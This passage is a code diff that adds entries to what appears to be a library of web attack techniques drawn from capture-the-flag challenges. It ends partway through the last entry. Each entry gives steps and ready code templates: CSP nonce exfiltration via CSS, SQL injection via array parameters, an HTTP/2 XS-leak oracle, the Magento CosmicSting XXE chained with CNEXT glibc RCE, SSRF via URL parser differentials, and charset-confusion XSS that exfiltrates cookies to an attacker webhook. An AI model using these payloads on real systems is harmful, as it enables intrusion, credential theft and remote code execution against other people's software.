@@ -1705,6 +1705,1204 @@ TECHNIQUES: list[dict] = [
             "tags": ["credentials", "exposed-db", "mysql", "direct-access", "privilege-escalation", "docker"],
         },
     },
+
+    # ── 29. CSS attribute selector nonce exfiltration → CSP bypass ──
+    {
+        "name": "css_attribute_selector_nonce_exfil",
+        "vuln_type": "xss",
+        "attack_metadata": {
+            "name": "CSS attribute selector nonce exfiltration — CSP bypass via style-src unsafe-inline",
+            "applies_when": (
+                "A web page uses CSP with `script-src 'nonce-<random>'` to restrict scripts, but "
+                "allows `style-src 'unsafe-inline'`. The nonce value is present in the DOM as an "
+                "attribute on a `<script>` tag. Attacker can inject HTML via innerHTML/stored XSS "
+                "that includes `<style>` blocks with CSS attribute selectors like "
+                "`script[nonce^=\"prefix\"] { background-image: url(attacker?c=X) }`. "
+                "By iterating prefix characters, the full nonce is leaked to the attacker server "
+                "one character at a time. With the nonce, the attacker can inject a script tag "
+                "(e.g., via `<iframe srcdoc>`) that passes the CSP nonce check."
+            ),
+            "prerequisites": [
+                "CSP: script-src 'nonce-<value>' (blocking inline scripts without nonce)",
+                "CSP: style-src 'unsafe-inline' (allowing injected <style> tags)",
+                "HTML injection or stored XSS via innerHTML that preserves <style> tags",
+                "Nonce value is present as an attribute in the DOM (e.g., <script nonce='...'>)",
+                "Attacker can trigger multiple page renders (hashchange navigation) to iterate nonce characters",
+                "External attacker server to receive CSS background-image callbacks",
+            ],
+            "technique_steps_md": (
+                "1. Identify CSP: `script-src 'nonce-X'` + `style-src 'unsafe-inline'`\n"
+                "2. Confirm innerHTML sink that preserves `<style>` tags in page content\n"
+                "3. Locate `<script nonce=\"...\">` in page source — nonce is in DOM\n"
+                "4. Inject CSS with attribute selectors for each candidate character:\n"
+                "   ```css\n"
+                "   script[nonce^=\"a\"] { background-image: url(http://attacker/leak?n=a) }\n"
+                "   script[nonce^=\"b\"] { background-image: url(http://attacker/leak?n=b) }\n"
+                "   ...\n"
+                "   ```\n"
+                "5. When CSS loads, browser requests the URL matching the actual nonce prefix\n"
+                "6. Attacker server receives the hit, extends the known prefix by one character\n"
+                "7. Generate new CSS payload with `script[nonce^=\"known_prefix+X\"]` for next char\n"
+                "8. Use hashchange navigation to reload content on same page (nonce stays stable)\n"
+                "9. Repeat until full nonce is recovered (typically 16-32 chars)\n"
+                "10. Inject final XSS payload with stolen nonce:\n"
+                "    `<iframe srcdoc=\"<script nonce=STOLEN src=//attacker/evil.js></script>\">`\n"
+                "11. Script executes with valid nonce, reads document.cookie, exfiltrates flag"
+            ),
+            "code_template": (
+                "# Generate CSS nonce-leak payload for one round\n"
+                "charset = 'abcdefghijklmnopqrstuvwxyz0123456789'\n"
+                "known_prefix = ''  # accumulated from previous rounds\n"
+                "rules = []\n"
+                "for c in charset:\n"
+                "    rules.append(\n"
+                "        f'script[nonce^=\"{known_prefix}{c}\"] {{'\n"
+                "        f'  background-image: url({attacker_url}/leak?n={known_prefix}{c})'\n"
+                "        f'}}'\n"
+                "    )\n"
+                "payload = '<style>* { display: block !important; }' + '\\n'.join(rules) + '</style>'\n"
+                "# Post payload as note content, share it, navigate bot via hashchange"
+            ),
+            "examples": [{
+                "params": {
+                    "csp": "script-src 'nonce-<random16>'; frame-src 'none'; style-src 'unsafe-inline'",
+                    "nonce_length": 16,
+                    "nonce_charset": "a-z0-9",
+                    "innerHTML_sink": "shared note content rendered via innerHTML",
+                    "hashchange_rerender": "share_read.js listens for hashchange → re-fetches and re-renders",
+                    "final_xss": "<iframe srcdoc=\"<script nonce=NONCE src=//evil/ex.js></script>\">",
+                    "cookie_target": "FLAG cookie (httpOnly=false, sameSite=Strict)",
+                },
+                "notes": (
+                    "The nonce is stable per page load — hashchange re-renders content but doesn't "
+                    "change the nonce. `* { display: block !important }` ensures the script element "
+                    "is visible for CSS background-image to fire. The bot visits with FLAG cookie "
+                    "set on localhost. sameSite=Strict means the attack must execute from same origin. "
+                    "CSRF via form POST to /write from attacker page creates the malicious notes."
+                ),
+            }],
+            "tags": ["css", "nonce-exfiltration", "csp-bypass", "attribute-selector", "xss",
+                     "style-injection", "innerHTML", "hashchange", "bot"],
+        },
+    },
+
+    # ── 30. HTTP parameter array type confusion → sanitization bypass → SQLi ──
+    {
+        "name": "param_array_type_confusion_sqli",
+        "vuln_type": "sqli",
+        "attack_metadata": {
+            "name": "HTTP parameter array type confusion — bypass string-only sanitization for SQL injection",
+            "applies_when": (
+                "A custom web server or framework parses HTTP POST parameters and supports array "
+                "syntax like `param[0]=value`, creating a different internal type (ARRAY) vs the "
+                "normal STRING type. A sanitization function (e.g., replaceString) checks if all "
+                "arguments are STRING type before performing replacements. If ANY argument is not "
+                "STRING, the function returns the unsanitized value. Attackers send `password[0]=SQLi` "
+                "to create an ARRAY-typed value that bypasses the type check, allowing single-quote "
+                "injection into SQL queries."
+            ),
+            "prerequisites": [
+                "Server parses param[idx]=value as ARRAY type distinct from STRING",
+                "Sanitization function type-checks args and skips processing for non-STRING types",
+                "SQL queries are built via string interpolation/formatting with the unsanitized value",
+                "ARRAY type's getStringValue() returns the raw string content preserving special chars",
+            ],
+            "technique_steps_md": (
+                "1. Identify parameter parsing: test `param[0]=value` vs `param=value` behavior\n"
+                "2. Locate sanitization: replaceString(input, \"'\", \"\") or similar SQL escaping\n"
+                "3. Confirm type-checking in sanitization: if arg type != STRING, return unsanitized\n"
+                "4. Send payload with array syntax: `password[0]=x' UNION SELECT secret FROM table-- -`\n"
+                "5. The ARRAY-typed value bypasses replaceString type check\n"
+                "6. formatString/query builder calls getStringValue() on the ARRAY, getting raw SQL payload\n"
+                "7. UNION SELECT extracts target data (admin password, flag, etc.)\n"
+                "8. Exfiltrated data appears in JWT token payload, response body, or error message"
+            ),
+            "code_template": (
+                "import subprocess, base64, json, sys\\n"
+                "url = sys.argv[1]\\n"
+                "# Array syntax password[0] creates ARRAY type, bypassing replaceString\\n"
+                "payload = \\\"asdf' union select password from user where username='admin'-- -\\\"\\n"
+                "r = subprocess.check_output([\\n"
+                "    'curl', f'{url}/login', '-X', 'POST', '-d',\\n"
+                "    f'username=a&password[0]={payload}'\\n"
+                "])\\n"
+                "# Extract JWT token from Set-Cookie or response body\\n"
+                "token = r[r.find(b'token=')+6:r.find(b\\\"';\\\")].decode()\\n"
+                "payload_b64 = token.split('.')[1]\\n"
+                "print(json.loads(base64.b64decode(payload_b64 + '==')))"
+            ),
+            "examples": [{
+                "params": {
+                    "server": "Custom C++ HTTP server with custom .cg template language",
+                    "array_syntax": "password[0]=value → ArrayValue (type=ARRAY)",
+                    "sanitizer": "replaceString(v1, v2, v3) checks all args for STRING type",
+                    "sanitizer_bypass": "ARRAY type for v1 → type check fails → v1 returned raw",
+                    "sqli_sink": "formatString('SELECT username FROM USER WHERE password=%', password)",
+                    "exfil": "UNION SELECT extracts admin password (=flag) into JWT username field",
+                },
+                "notes": (
+                    "The C++ replaceString checks `v1->getType() != ValueType::STRING` and returns v1 "
+                    "unchanged. Array param syntax `password[0]=...` creates ValueType::ARRAY. "
+                    "formatString uses getStringValue() which works for any type, preserving the raw "
+                    "SQL injection payload. The flag is stored as the admin user's password in SQLite."
+                ),
+            }],
+            "tags": ["sqli", "type-confusion", "array-syntax", "sanitization-bypass",
+                     "custom-server", "jwt", "sqlite"],
+        },
+    },
+
+    # ── 31. HTTP/2 stream exhaustion XS-Leak via pending response oracle ──
+    {
+        "name": "http2_stream_exhaustion_xs_leak",
+        "vuln_type": "information_disclosure",
+        "attack_metadata": {
+            "name": "HTTP/2 stream multiplexing exhaustion — XS-Leak via pending response oracle",
+            "applies_when": (
+                "A web application is served behind an HTTP/2-enabled reverse proxy (nginx with `http2 on`) "
+                "that has a limited number of concurrent streams per connection (default 128). An endpoint "
+                "returns a pending/incomplete response for certain inputs (e.g., missing file → NestJS `return;` "
+                "without `res.sendFile()` when using `@Res()` without passthrough). Another endpoint performs "
+                "a prefix-based file lookup that returns data for correct prefixes but hangs for wrong ones. "
+                "The application uses `SameSite=None; Secure` cookies and `frame-ancestors: *` CSP, allowing "
+                "cross-site iframe embedding with authenticated context. A side-channel view-count mechanism "
+                "(e.g., POST `/api/memo/:id/view` after rendering) serves as the oracle."
+            ),
+            "prerequisites": [
+                "HTTP/2 enabled on reverse proxy with limited concurrent streams (nginx default: 128)",
+                "Endpoint that returns pending/hanging response for invalid inputs (NestJS @Res() without passthrough)",
+                "Admin-only endpoint with prefix-based file matching (file.startsWith(input))",
+                "SameSite=None + Secure cookie → cross-site iframe sends credentials",
+                "CSP frame-ancestors: * → page embeddable in attacker iframe",
+                "View count or similar side-effect that depends on remaining available streams",
+                "Bot that visits attacker-controlled URL while authenticated as admin",
+                "DOMPurify-sanitized HTML allowing <img> tags with same-origin src",
+            ],
+            "technique_steps_md": (
+                "1. Identify HTTP/2 behind nginx: check `http2 on` in nginx.conf, default 128 streams\n"
+                "2. Find pending response endpoint: `/api/image?filename=nonexistent` hangs (NestJS @Res() bug)\n"
+                "3. Find prefix-match admin endpoint: `/api/image/admin?filename=flag_X` returns image or hangs\n"
+                "4. Confirm SameSite=None cookie + frame-ancestors: * CSP\n"
+                "5. Create N memos (one per candidate char), each containing:\n"
+                "   - 127 `<img src=\"/api/image?filename=N\">` to occupy 127 of 128 streams with pending responses\n"
+                "   - 1 `<img src=\"/api/image/admin?filename=prefix_GUESS\">` as the 128th stream\n"
+                "6. Share each memo and collect sharedKeys\n"
+                "7. Host attacker page that loads each shared memo in sequential iframes\n"
+                "8. Bot visits attacker page → admin cookie sent → iframes load in admin context\n"
+                "9. For correct guess: admin image returns → connection freed → view POST succeeds → views=1\n"
+                "10. For wrong guess: all 128 streams blocked → view POST queued → views=0\n"
+                "11. Check view counts as oracle → extract one character per round\n"
+                "12. Repeat for each hex character of the flag filename"
+            ),
+            "code_template": (
+                "// Create 16 memos (0-9a-f), each blocking 127 streams + 1 guess stream\\n"
+                "const CHARS = '0123456789abcdef';\\n"
+                "const TEMPLATE = Array.from({length: 127}, (_, i) =>\\n"
+                "    `<img src=\\\"/api/image?filename=${i+1}\\\">`\\n"
+                ").join('');\\n"
+                "for (let c of CHARS) {\\n"
+                "    await createMemo({\\n"
+                "        title: 'test_' + c,\\n"
+                "        content: TEMPLATE + `<img src=\\\"/api/image/admin?filename=${leaked}${c}\\\">`,\\n"
+                "    });\\n"
+                "}\\n"
+                "// Share memos, bot visits iframe page, check views==1 for correct char"
+            ),
+            "examples": [{
+                "params": {
+                    "proxy": "nginx with http2 on, 128 default max concurrent streams",
+                    "pending_endpoint": "/api/image?filename=N (nonexistent → NestJS return; hangs)",
+                    "admin_endpoint": "/api/image/admin with startsWith() prefix file matching",
+                    "cookie": "SameSite=None; Secure; HttpOnly → sent in cross-site iframes",
+                    "csp": "frame-ancestors: * → any origin can iframe the app",
+                    "oracle": "memo view count (POST /api/memo/:id/view) succeeds only if streams available",
+                    "flag_format": "flag_{hex16}.png → 16 hex chars to leak",
+                },
+                "notes": (
+                    "The key insight is HTTP/2 multiplexing: all requests share one TCP connection with "
+                    "limited streams. By filling 127/128 streams with pending responses, only 1 stream "
+                    "remains. If the guess is correct, the admin image returns and frees the connection, "
+                    "allowing the view-count POST to succeed. If wrong, all 128 streams are blocked. "
+                    "nginx keepalive_requests=2500 ensures no mid-leak connection reset. "
+                    "sec-fetch-site: same-origin check is bypassed because <img> loads within same-origin iframe."
+                ),
+            }],
+            "tags": ["xs-leak", "http2", "stream-exhaustion", "multiplexing", "pending-response",
+                     "iframe", "samesite-none", "csp-bypass", "oracle", "prefix-match", "nestjs"],
+        },
+    },
+
+    # ── 32. Magento CosmicSting XXE + CNEXT iconv RCE (CVE-2024-34102 + CVE-2024-2961) ──
+    {
+        "name": "magento_cosmicsting_xxe_cnext_rce",
+        "vuln_type": "rce",
+        "attack_metadata": {
+            "name": "Magento CosmicSting XXE + CNEXT glibc iconv heap overflow → RCE",
+            "applies_when": (
+                "Magento 2.4.7 or earlier is running with PHP 8.x on a glibc version vulnerable "
+                "to CVE-2024-2961 (e.g., glibc 2.35-0ubuntu3). The REST API endpoint "
+                "`/rest/all/V1/guest-carts/<id>/estimate-shipping-methods` processes XML data "
+                "from the `sourceData.data` field without proper XXE protection (CVE-2024-34102). "
+                "If a WAF or application-level filter blocks the literal string 'DOCTYPE', it can "
+                "be bypassed via JSON unicode escapes (e.g., `\\u0044OCTYPE`). The XXE provides a "
+                "file-read primitive, which is then chained with CVE-2024-2961 (iconv buffer overflow "
+                "in UTF-8 → ISO-2022-CN-EXT conversion) via php://filter chains to achieve RCE."
+            ),
+            "prerequisites": [
+                "Magento <= 2.4.7 with CVE-2024-34102 (CosmicSting XXE)",
+                "glibc vulnerable to CVE-2024-2961 (iconv buffer overflow)",
+                "PHP 8.x with zlib and iconv extensions enabled",
+                "Attacker-controlled HTTP server reachable from the Magento server (for XXE OOB exfil)",
+                "php://filter, data://, and zlib.inflate wrappers available",
+            ],
+            "technique_steps_md": (
+                "1. Identify Magento version (2.4.7): check `/magento_version` or response headers\n"
+                "2. Identify glibc version via XXE file read of `/proc/self/maps` or package info\n"
+                "3. Set up attacker HTTP server to receive XXE OOB exfiltration\n"
+                "4. Send XXE payload via POST to `/rest/all/V1/guest-carts/test/estimate-shipping-methods`\n"
+                "5. Bypass DOCTYPE filter: use `\\u0044OCTYPE` in JSON body instead of `DOCTYPE`\n"
+                "6. XXE reads files via `php://filter/convert.base64-encode/resource=<path>`\n"
+                "7. Read `/proc/self/maps` to get heap base address and libc path/address\n"
+                "8. Download libc binary to extract symbol offsets (system, malloc, realloc)\n"
+                "9. Build CNEXT exploit php://filter chain:\n"
+                "   - Heap spray with zlib.inflate + dechunk + iconv filters\n"
+                "   - Trigger iconv overflow (UTF-8 → ISO-2022-CN-EXT) with '劄' character\n"
+                "   - Corrupt zend_mm_heap free_slot and custom_heap pointers\n"
+                "   - Redirect efree → system() with command as chunk data\n"
+                "10. Send the crafted filter chain via XXE → RCE achieved\n"
+                "11. Execute SUID `/readflag` or read `/flag` directly"
+            ),
+            "code_template": (
+                "import json, requests\\n"
+                "# Magento CosmicSting XXE with DOCTYPE bypass\\n"
+                "json_data = {\\n"
+                "    'address': {'totalsReader': {'collectorList': {'totalCollector': {\\n"
+                "        'sourceData': {\\n"
+                "            'data': '<?xml version=\\\"1.0\\\" ?> <!DOCTYPE r [ <!ELEMENT r ANY >\\n"
+                "                <!ENTITY % sp SYSTEM \\\"http://attacker/file/BASE64_PATH\\\"> %sp;\\n"
+                "                %param1; ]> <r>&exfil;</r>',\\n"
+                "            'options': 524290,\\n"
+                "        }\\n"
+                "    }}}}\\n"
+                "}\\n"
+                "# Bypass DOCTYPE filter with unicode escape\\n"
+                "payload = json.dumps(json_data).replace('DOCTYPE', '\\\\u0044OCTYPE')\\n"
+                "r = requests.post(f'{url}/rest/all/V1/guest-carts/test/estimate-shipping-methods',\\n"
+                "    data=payload, headers={'Content-Type': 'application/json'})"
+            ),
+            "examples": [{
+                "params": {
+                    "magento_version": "2.4.7",
+                    "glibc_version": "2.35-0ubuntu3 (vulnerable to CVE-2024-2961)",
+                    "php_version": "8.1",
+                    "xxe_endpoint": "/rest/all/V1/guest-carts/test/estimate-shipping-methods",
+                    "filter_bypass": "\\u0044OCTYPE in JSON body bypasses strpos($input, 'DOCTYPE')",
+                    "iconv_trigger": "UTF-8 → ISO-2022-CN-EXT with '劄' char causes 1-byte heap overflow",
+                    "rce_method": "Overwrite zend_mm_heap custom_heap.efree → __libc_system",
+                },
+                "notes": (
+                    "CVE-2024-34102 (CosmicSting) is a critical Magento XXE that requires no authentication. "
+                    "CVE-2024-2961 (CNEXT) is a glibc iconv buffer overflow exploitable via PHP filter chains. "
+                    "The combo was first published by @cfreal_ (LEXFO/AMBIONICS). The DOCTYPE filter bypass "
+                    "using JSON unicode escapes is a common WAF evasion technique. The exploit uses the "
+                    "`kill -9 $PPID` pattern to prevent multiple system() calls with random data."
+                ),
+            }],
+            "tags": ["xxe", "rce", "cve-2024-34102", "cve-2024-2961", "magento", "cosmicsting",
+                     "cnext", "iconv", "heap-overflow", "php-filter", "glibc", "waf-bypass"],
+        },
+    },
+
+    # ── 33. URL authority parsing differential (edge canonicalization vs Go url.Parse) ──
+    {
+        "name": "url_authority_edge_canonicalization_bypass",
+        "vuln_type": "ssrf",
+        "attack_metadata": {
+            "name": "URL authority parsing differential — edge canonicalization vs Go url.Parse",
+            "applies_when": (
+                "A Go server validates URLs using a custom edge canonicalization function that "
+                "double-decodes percent-encoding (`collapseEscapedHost`), replaces CJK fullwidth dots "
+                "(。．｡) with ASCII dots, and strips IPv6 bracket sections under specific conditions "
+                "(both decode AND compat dot used). The validated URL is then re-parsed with Go's "
+                "`url.Parse` for actual use (storage, iframe src, redirect). The edge parser resolves "
+                "the authority to a trusted domain (e.g., `brief.relaydesk.local`), while `url.Parse` "
+                "resolves the same URL to an attacker-controlled host (IPv6-mapped IPv4 in brackets)."
+            ),
+            "prerequisites": [
+                "Server uses a custom edge authority canonicalization with double percent-decoding",
+                "CJK/fullwidth dot normalization (。→., ．→., ｡→.) in authority parsing",
+                "IPv6 bracket stripping logic conditioned on both decode AND compat dot flags",
+                "Go url.Parse used as the delivery/storage parser (different from edge validation)",
+                "Validation explicitly requires edgeRef.Authority != deliveryRef.Authority (parsing differential is REQUIRED by design)",
+                "Attacker needs external HTTP listener reachable from the bot's browser",
+            ],
+            "technique_steps_md": (
+                "1. Identify the URL validation flow: edge canonicalization vs Go url.Parse\n"
+                "2. Craft a URL that satisfies the edge parser's trusted domain check:\n"
+                "   - Double-encode a character: `%2566` → edge decodes twice → `f`\n"
+                "   - Use CJK dot U+3002 (。) percent-encoded as `%E3%80%82` → edge normalizes to `.`\n"
+                "   - Append `[IPv6-mapped-IPv4]:port` after the CJK dot\n"
+                "   - Edge parser: strips brackets when both decode+compat flags set → sees `brief.relaydesk.local`\n"
+                "3. Go url.Parse resolves the same URL differently:\n"
+                "   - Single decode: `%2566` → `%66`, brackets parsed as IPv6 literal\n"
+                "   - Hostname() returns the IPv6 address (attacker's IP)\n"
+                "4. The stored URL (from url.Parse) points to attacker's server\n"
+                "5. When rendered in iframe/redirect, the browser connects to attacker"
+            ),
+            "code_template": (
+                "import urllib.parse\\n"
+                "def callback_url(host, port, namespace):\\n"
+                "    parts = [int(p) for p in host.split('.')]\\n"
+                "    mapped = f'::ffff:{(parts[0]<<8)|parts[1]:x}:{(parts[2]<<8)|parts[3]:x}'\\n"
+                "    return f'http://brie%2566.relaydesk.local%E3%80%82[{mapped}]:{port}/notes/{namespace}'"
+            ),
+            "examples": [{
+                "params": {
+                    "trusted_domain": "brief.relaydesk.local",
+                    "edge_canon": "double percent-decode + CJK dot normalize + bracket strip",
+                    "go_parser": "url.Parse → Hostname() returns IPv6 literal",
+                    "url_pattern": "http://brie%2566.relaydesk.local%E3%80%82[::ffff:X:Y]:PORT/notes/...",
+                    "validation_check": "edgeRef.Authority == expectedHost AND edgeRef.Authority != deliveryRef.Authority",
+                },
+                "notes": (
+                    "This is a URL parser differential attack. The edge canonicalizer and Go's url.Parse "
+                    "interpret the same URL differently. The key trick is combining: (1) double percent-encoding "
+                    "(%2566 → %66 → f), (2) CJK dot 。 (U+3002, %E3%80%82) normalized to ASCII dot, and "
+                    "(3) IPv6 bracket stripping when both decode and compat-dot flags are set. The NormalizeReviewLink "
+                    "function explicitly requires the two parsers to disagree (deliveryRef != edgeRef), which is "
+                    "the design flaw that enables the attack."
+                ),
+            }],
+            "tags": ["url-parsing", "authority-confusion", "parser-differential", "percent-encoding",
+                     "cjk-dot", "ipv6", "ssrf", "open-redirect", "go", "iframe"],
+        },
+    },
+
+    # ── 34. HTML card dual-extraction: thread marker vs action link confusion ──
+    {
+        "name": "html_card_thread_vs_action_link_confusion",
+        "vuln_type": "logic_flaw",
+        "attack_metadata": {
+            "name": "HTML card dual-extraction — thread marker uses first link, action uses last compatible link",
+            "applies_when": (
+                "An HTML email/ticket body is parsed for two different purposes from the same container element: "
+                "(1) `ExtractThreadMarker` picks the FIRST link with class `summary-link` for thread matching, "
+                "while (2) `ExtractActionCard` picks the LAST link with any compatible class (`summary-link`, "
+                "`message-link`, or `entry-link`) for the actual review/action link. This allows an attacker to "
+                "include a legitimate first link that passes thread validation alongside a malicious second link "
+                "that gets used as the action link. The container must have class `message-summary` or similar, "
+                "and the links must have specific data attributes (data-mode, data-tags, data-thread-id)."
+            ),
+            "prerequisites": [
+                "HTML parser extracts multiple links from the same container (<section>/<div>/<article>)",
+                "Thread validation uses the first summary-link (ExtractThreadMarker)",
+                "Action/review link extraction uses the last compatible link (ExtractActionCard)",
+                "Container class matches: message-summary, message-panel, queue-summary, or data-layout=compact",
+                "Links need data-mode='inline', data-tags='summary,activity,notes', matching data-thread-id",
+            ],
+            "technique_steps_md": (
+                "1. Create a container: `<section class=\"message-summary\" data-layout=\"compact\">`\n"
+                "2. First link (passes thread validation):\n"
+                "   `<a class=\"summary-link\" href=\"https://legit.domain/notes/safe\" "
+                "data-mode=\"inline\" data-tags=\"summary, activity, notes\" "
+                "data-thread-id=\"THREAD_KEY\">review summary</a>`\n"
+                "3. Second link (malicious action link):\n"
+                "   `<a class=\"entry-link\" href=\"ATTACKER_URL\" "
+                "data-view=\"inline\" data-sections=\"summary, activity, notes\" "
+                "data-record-id=\"THREAD_KEY\">case handoff</a>`\n"
+                "4. Thread validation passes (first link matches expected thread)\n"
+                "5. Worker extracts action link from last compatible link (attacker URL)\n"
+                "6. Attacker URL gets stored in automation_context and loaded in iframe"
+            ),
+            "code_template": (
+                "def followup_html(callback_url, subject):\\n"
+                "    thread_key = '-'.join(subject.lower().split())\\n"
+                "    return (\\n"
+                "        '<section class=\"message-summary\" data-layout=\"compact\">'\\n"
+                "        '<a class=\"summary-link\" href=\"https://legit/notes/safe\" '\\n"
+                "        f'data-mode=\"inline\" data-tags=\"summary, activity, notes\" '\\n"
+                "        f'data-thread-id=\"{thread_key}\">review</a>'\\n"
+                "        f'<a class=\"entry-link\" href=\"{callback_url}\" '\\n"
+                "        f'data-view=\"inline\" data-sections=\"summary, activity, notes\" '\\n"
+                "        f'data-record-id=\"{thread_key}\">handoff</a>'\\n"
+                "        '</section>'\\n"
+                "    )"
+            ),
+            "examples": [{
+                "params": {
+                    "first_link_class": "summary-link (used by ExtractThreadMarker — first link)",
+                    "second_link_class": "entry-link (used by ExtractActionCard — last compatible link)",
+                    "compat_classes": "summary-link, message-link, entry-link (all accepted by compatReferenceCardFromAttrs)",
+                    "compat_attrs": "data-view/data-mode, data-sections/data-tags, data-record-id/data-thread-id (aliases)",
+                },
+                "notes": (
+                    "The vulnerability is in the asymmetry between ExtractThreadMarker (returns cards[0]) and "
+                    "ExtractActionCard (returns cards[len(cards)-1]). The compat card extraction also accepts "
+                    "alias attributes: data-view for data-mode, data-sections for data-tags, data-record-id "
+                    "for data-thread-id. This makes it easy to construct a second link that passes all checks."
+                ),
+            }],
+            "tags": ["html-parsing", "logic-flaw", "dual-extraction", "thread-confusion",
+                     "link-injection", "email", "ticket-system", "postmessage"],
+        },
+    },
+
+    # ── 35. Sliding window fragment oracle for character-by-character secret extraction ──
+    {
+        "name": "sliding_window_fragment_oracle",
+        "vuln_type": "information_disclosure",
+        "attack_metadata": {
+            "name": "Sliding window fragment oracle — 4-char window index enables character-by-character secret extraction",
+            "applies_when": (
+                "A server creates a sliding window index of all N-char substrings (default N=4) of a secret "
+                "string (e.g., flag). An endpoint checks if a query matches any stored fragment and returns "
+                "a distinguishable response (200 for hit, 404 for miss). The endpoint is protected by one-time "
+                "visit tokens (wid + rv), and the response can be observed from an attacker page via script "
+                "onload/onerror events. A bot (admin) visits attacker-controlled pages that trigger these "
+                "probes with fresh tokens obtained per iteration through the application's workflow."
+            ),
+            "prerequisites": [
+                "Secret indexed as all N-char (typically 4) sliding windows in a fragment map",
+                "Endpoint returns distinguishable responses based on fragment existence (200 vs 404)",
+                "One-time visit tokens (rv) consumed per request — each probe needs a fresh token",
+                "Fresh tokens obtainable by triggering application workflow (e.g., new follow-up ticket → admin mail → visit token)",
+                "Bot (Playwright/Puppeteer) visits attacker page and navigates to token-bearing URLs",
+                "Script tag onload/onerror usable as oracle from attacker's page",
+                "Known prefix of the secret (e.g., flag format 'codegate2026{')",
+            ],
+            "technique_steps_md": (
+                "1. Know the secret's prefix (e.g., `codegate2026{`) and charset (e.g., hex + `}`)\n"
+                "2. For each candidate character:\n"
+                "   a. Take last 3 chars of known prefix + candidate = 4-char window\n"
+                "   b. Trigger application workflow to generate a new visit token (wid, rv)\n"
+                "   c. Bot visits attacker page → attacker page gets wid+rv from URL params\n"
+                "   d. Attacker page creates `<script src='/mail/queue/assets/{wid}/{slot}.js?q={window}&rv={rv}'>`\n"
+                "   e. onload → HIT (character is correct), onerror → MISS\n"
+                "3. Extend known prefix with the correct character\n"
+                "4. Repeat until closing delimiter (e.g., `}`) is found\n"
+                "5. Each probe requires: prepare thread → send follow-up → wait for bot → collect result"
+            ),
+            "code_template": (
+                "# Oracle probe via script load\\n"
+                "script = document.createElement('script')\\n"
+                "script.onload = () => report('HIT')\\n"
+                "script.onerror = () => report('MISS')\\n"
+                "script.src = assetURL(wid, candidate_4char, bucket, rv)\\n"
+                "document.head.appendChild(script)"
+            ),
+            "examples": [{
+                "params": {
+                    "window_size": "4 characters (archiveWindowSize = 4)",
+                    "secret_format": "codegate2026{hex_chars} — known prefix + hex charset + closing brace",
+                    "oracle_endpoint": "/mail/queue/assets/{resumeRef}/{slot}.js?q={query}&bucket={bucket}&rv={visitToken}",
+                    "token_flow": "follow-up ticket → worker → admin mail → bot opens → iframe postMessage → /mail/open/ → wid+rv",
+                    "response": "200 + JS body if HasFragment(query)=true, 404 otherwise",
+                },
+                "notes": (
+                    "The archive stores ALL 4-char windows of the secret, so probing 'ate2' confirms that "
+                    "'ate2' appears somewhere in the secret. By using the last 3 known chars + 1 candidate, "
+                    "each probe uniquely identifies the next character. The one-time visit token prevents "
+                    "replay but can be obtained repeatedly through the application workflow. The total number "
+                    "of probes is O(|secret| * |charset|), e.g., ~24 chars * 17 candidates ≈ 408 probes."
+                ),
+            }],
+            "tags": ["oracle", "sliding-window", "fragment-index", "script-onload", "onerror",
+                     "side-channel", "visit-token", "bot", "character-extraction", "postmessage"],
+        },
+    },
+
+    # ── 36. Charset mismatch XSS — Java x-macroman vs Chrome auto-detection → ISO-2022-JP ──
+    {
+        "name": "charset_mismatch_iso2022jp_xss",
+        "vuln_type": "xss",
+        "attack_metadata": {
+            "name": "Charset mismatch XSS — server-side charset unsupported by browser triggers auto-detection to ISO-2022-JP",
+            "applies_when": (
+                "A web application reads email/content bodies using Java's `message.getContent()` which decodes "
+                "using the Content-Type charset, then sanitizes HTML (Jsoup + DOMPurify). The sanitized content "
+                "is served with the same charset in the response Content-Type header. If the attacker specifies "
+                "a charset that Java supports but Chrome does not recognize (e.g., `x-macroman`), Chrome falls "
+                "back to charset auto-detection. By embedding ISO-2022-JP escape sequences (`\\x1b(J`) in the "
+                "content, Chrome auto-detects the encoding as ISO-2022-JP, causing byte sequences to be "
+                "reinterpreted differently than the server-side sanitizers expected, breaking out of string "
+                "or tag contexts to achieve XSS."
+            ),
+            "prerequisites": [
+                "Server uses Java mail API (message.getContent()) with charset-based decoding",
+                "Server-side HTML sanitization (Jsoup Safelist + DOMPurify) operates on decoded content",
+                "Response Content-Type includes the email's charset directly (charset= from mail header)",
+                "Java supports the chosen charset (e.g., x-macroman, x-mac-roman) but Chrome < 139 does not",
+                "Chrome auto-detection feature for unrecognized charsets (ICU CharsetDetector)",
+                "ISO-2022-JP escape sequences survive sanitization (e.g., inside <style> or attribute values)",
+                "Admin bot (Puppeteer/Playwright with Chromium) opens the email content page",
+                "Sensitive data (flag/cookie) accessible via document.cookie or similar",
+            ],
+            "technique_steps_md": (
+                "1. Register a user on the webmail service\n"
+                "2. Craft email via SMTP with:\n"
+                "   - `Content-Type: text/html; charset=x-macroman`\n"
+                "   - `Content-Transfer-Encoding: base64`\n"
+                "   - Body containing ISO-2022-JP escape `\\x1b(J` inside `<style>` tag\n"
+                "3. Payload: `<style>\\x1b(J'\";navigator.sendBeacon('WEBHOOK',document.cookie);//</style>`\n"
+                "4. Server processing:\n"
+                "   - Java decodes body as x-macroman (supported) → `\\x1b(J` becomes harmless bytes\n"
+                "   - Jsoup sanitizes: `<style>` tag allowed, content appears safe (no script tags)\n"
+                "   - DOMPurify sanitizes: same — appears safe in context\n"
+                "   - Response served with `Content-Type: text/html; charset=x-macroman`\n"
+                "5. Chrome rendering:\n"
+                "   - Does not recognize `x-macroman` → triggers charset auto-detection\n"
+                "   - ICU detects ISO-2022-JP due to escape sequence `\\x1b(J`\n"
+                "   - Content reinterpreted under ISO-2022-JP encoding\n"
+                "   - `\\x1b(J` switches to JIS X 0201 Roman mode → following bytes reinterpreted\n"
+                "   - Breaks out of `<style>` context → executes JavaScript\n"
+                "6. XSS fires: cookie/flag exfiltrated via sendBeacon to attacker webhook"
+            ),
+            "code_template": (
+                "import smtplib, base64\\n"
+                "content = b'<style>\\x1b(J\\'\";"
+                "navigator.sendBeacon(`WEBHOOK`,document.cookie);//</style>'\\n"
+                "encoded = base64.b64encode(content).decode()\\n"
+                "message = f'From: {email}\\\\nTo: admin@target.com\\\\n'\\n"
+                "message += f'Subject: x\\\\nContent-Type: text/html; charset=x-macroman\\\\n'\\n"
+                "message += f'Content-Transfer-Encoding: base64\\\\n\\\\n{encoded}'\\n"
+                "server = smtplib.SMTP(smtp_host, 25)\\n"
+                "server.login(email, password)\\n"
+                "server.sendmail(email, 'admin@target.com', message)"
+            ),
+            "examples": [{
+                "params": {
+                    "java_charset": "x-macroman (supported by Java, not by Chrome)",
